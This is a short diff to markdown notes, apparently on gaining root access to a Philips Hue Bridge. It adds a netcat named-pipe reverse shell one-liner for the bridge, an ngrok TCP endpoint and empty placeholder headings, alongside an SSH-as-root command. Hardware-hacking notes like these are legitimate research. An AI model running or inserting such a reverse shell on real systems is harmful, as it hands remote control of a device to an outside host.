@@ -51,6 +51,12 @@ reboot
 ### Setting up Ngrok
 #TODO
 
+#### On the attacher machine
+
+#### On the Philips Hue Bridge
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.1.2 443 >/tmp/f
+
+4.tcp.eu.ngrok.io:17055
 ### Connect to the philips HUE
 ssh -i ~/.ssh/my_rsa_key -o 'PubkeyAcceptedAlgorithms +ssh-rsa' -o 'HostkeyAlgorithms +ssh-rsa' root@192.168.10.10
 
